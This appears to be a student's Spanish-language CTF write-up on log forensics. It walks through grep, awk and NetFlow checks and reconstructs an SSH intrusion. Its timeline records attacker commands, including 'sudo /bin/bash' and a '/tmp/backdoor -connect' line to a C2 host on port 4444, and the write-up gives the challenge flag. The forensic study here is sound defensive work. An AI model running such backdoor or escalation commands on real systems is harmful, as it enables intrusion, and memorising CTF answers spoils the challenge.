# 🕵️ CTF — Análisis Forense de Logs

> **Categoría:** Digital Forensics / STEGO  
> **Dificultad:** 🔴 Difícil  
> **Puntos:** 90  
> **Reto:** Credenciales Robadas

---

## 📁 Archivos proporcionados

|Archivo|Descripción|
|---|---|
|`auth_clean.txt`|Log de autenticación — **manipulado**|
|`syslog_clean.txt`|Syslog del sistema — **manipulado**|
|`journal_truth.log`|Export del systemd journal — **fuente de verdad**|
|`nginx_access.log`|Log de acceso web de nginx|
|`netflow.log`|Registro de flujo de red (estilo NetFlow)|

---

## 🧭 Metodología paso a paso

### 1️⃣ Descomprimir y reconocer el terreno

```bash
unzip logs.zip
ls -la logs/
```

> 💡 **Tip:** Comparar el tamaño de los archivos. Un log muy pequeño respecto a otros puede indicar manipulación.

---

### 2️⃣ Leer los logs "limpios" primero

```bash
cat logs/auth_clean.txt
cat logs/syslog_clean.txt
```

Anotar:

- ¿Qué IPs aparecen?
- ¿Hay logins exitosos o solo fallidos?
- ¿Qué usuarios se mencionan?

> ⚠️ En este reto, los logs limpios solo mostraban brute force de `198.51.100.99` contra el user `backup` — una **distracción deliberada**.

---

### 3️⃣ Leer el journal (fuente de verdad)

```bash
cat logs/journal_truth.log
```

El **systemd journal** es más difícil de manipular que syslog. Buscar:

```bash
grep "Accepted" logs/journal_truth.log       # Logins exitosos
grep "EXECVE" logs/journal_truth.log         # Comandos ejecutados
grep "EGRESS\|connect\|backdoor" logs/journal_truth.log  # C2
```

> 🔑 **Señal clave:** `Forwarding to syslog missed X messages` → indica eventos **deliberadamente omitidos** del syslog.

---

### 4️⃣ Buscar IPs y eventos con grep

```bash
# Comparar IPs en journal vs logs limpios
grep "Accepted" logs/journal_truth.log
grep "Accepted" logs/auth_clean.txt

# Comandos ejecutados (audit)
grep "EXECVE" logs/journal_truth.log

# Conexiones salientes sospechosas
grep "EGRESS" logs/journal_truth.log
```

---

### 5️⃣ Confirmar con NetFlow

```bash
cat logs/netflow.log

# Buscar IPs sospechosas descubiertas antes
grep "198.51.100.42" logs/netflow.log
grep "4444" logs/netflow.log
```

> 💡 El NetFlow registra tráfico de red real — más difícil de falsificar que logs de texto plano.

---

### 6️⃣ Correlacionar con nginx

```bash
# ¿Visitó algo antes del ataque?
grep "203.0.113.77" logs/nginx_access.log

# Endpoints más visitados por esa IP
grep "203.0.113.77" logs/nginx_access.log | awk '{print $7}' | sort | uniq -c | sort -rn
```

---

### 7️⃣ Construir la línea de tiempo

```bash
# Juntar todo y ordenar por hora
cat logs/auth_clean.txt logs/journal_truth.log logs/syslog_clean.txt \
  | sort -k1,3 | grep "10:03\|10:04"
```

---

## 🔍 Línea de tiempo reconstruida

```
09:59–10:02  Brute force SSH desde 198.51.100.99 → user backup
             ↳ DISTRACCIÓN — nunca logró acceso

10:03:40     Conexión SSH desde 203.0.113.77 (atacante real)
10:03:42     Intento fallido como 'admin'
10:03:44     ✅ Login exitoso como usuario 'app' (con contraseña)
10:03:47     sudo /bin/bash → escalada a ROOT
10:04:02     Ejecuta ./deploy.sh --quick
10:04:14     chmod +x /tmp/backdoor
10:04:17     /tmp/backdoor -connect 198.51.100.42:4444
             ↳ Kernel confirma conexión saliente (EGRESS)
             ↳ NetFlow confirma: bytes_out=18432
10:04:21     Atacante cierra sesión limpiamente
```

---

## 🚨 Indicadores de Compromiso (IOC)

|Tipo|Valor|
|---|---|
|IP Atacante|`203.0.113.77`|
|IP señuelo (brute force)|`198.51.100.99`|
|Cuenta comprometida|`app`|
|Backdoor|`/tmp/backdoor`|
|C2 IP|`198.51.100.42`|
|C2 Puerto|`4444`|
|Agente C2 adicional|`203.0.113.200:9001` (System Relay Agent)|

---

## 🏁 Flag / Token

```
203.0.113.77_198.51.100.42_4444
```

**Formato:** `ATTACKER-IP_C2-ENDPOINT-IP_PORT`

---

## 🧠 Reglas para CTFs de Forense

|Señal|Significado|
|---|---|
|Log limpio inusualmente pequeño|Probable manipulación|
|`missed X messages` en journal|Eventos borrados del syslog|
|Brute force obvio + otro login exitoso|El brute force es **distracción**|
|Puerto saliente no estándar (4444, 1337, 9001)|Canal de Comando y Control (C2)|
|`sudo /bin/bash`|Escalada de privilegios interactiva|
|`chmod +x /tmp/`|Instalación de backdoor/malware|
|Sesión SSH muy corta (< 2 min)|Ataque automatizado o quirúrgico|

---

## 🛠 Comandos útiles (cheatsheet)

```bash
# Extraer texto de binarios
strings archivo

# Buscar patrón con regex
grep -E "patron1|patron2" archivo.log

# Extraer columna específica (ej: URL en nginx)
awk '{print $7}' nginx_access.log

# Contar frecuencias
sort | uniq -c | sort -rn

# Comparar dos logs
diff log1.txt log2.txt

# Ordenar eventos por tiempo
cat *.log | sort -k1,3

# Buscar IPs únicas
grep -oE "[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+" archivo.log | sort -u
```

---

## 📚 Conceptos clave

> **syslog** — Log tradicional de Linux, fácil de manipular editando el archivo de texto.

> **systemd journal** — Almacenamiento binario con checksums, más resistente a manipulación. Se exporta con `journalctl`.

> **NetFlow** — Protocolo de registro de flujos de red a nivel de router/firewall. Registra src/dst IP, puertos y bytes transferidos.

> **C2 (Command & Control)** — Servidor remoto desde el que el atacante envía instrucciones al sistema comprometido.

> **Lateral movement** — Técnica de moverse entre sistemas dentro de una red comprometida.

---

_Notas personales del reto — CTF Credenciales Robadas_